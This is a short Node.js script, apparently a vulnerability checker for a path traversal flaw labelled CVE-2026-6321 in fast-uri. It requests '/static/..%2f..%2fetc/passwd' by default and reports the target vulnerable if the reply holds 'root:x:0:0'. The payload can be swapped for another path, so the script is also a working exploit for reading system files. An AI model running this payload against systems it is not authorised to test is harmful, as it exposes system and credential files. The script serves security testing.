#!/usr/bin/env node
// fast-uri Path Traversal Detector (CVE-2026-6321)
// Usage: node check.js <TARGET_URL> [PAYLOAD_PATH] [EXPECTED_STRING]

const target = process.argv[2];
const payloadPath = process.argv[3] || "/static/..%2f..%2fetc/passwd";
const expectedString = process.argv[4] || "root:x:0:0";

if (!target) {
  console.log("Usage: node check.js <target_url> [payload_path] [expected_string]\nExample: node check.js 'http://localhost:3000/' '/static/..%2f..%2fetc/passwd' 'root:x:0:0'");
  process.exit(1);
}

// target should be the base URL
const baseUrl = target.endsWith('/') ? target.slice(0, -1) : target;
const url = baseUrl + (payloadPath.startsWith('/') ? payloadPath : `/${payloadPath}`);

fetch(url).then(async res => {
  const body = await res.text();
  if (res.status === 200 && body.includes(expectedString)) {
    console.log(`[VULNERABLE] Successfully traversed path. Found expected string: "${expectedString}"`);
    process.exit(1);
  } else {
    console.log("[SAFE] Target is not vulnerable or behavior masked.");
    process.exit(0);
  }
}).catch(e => {
  console.log("[ERROR]", e.message);
  process.exit(2);
});
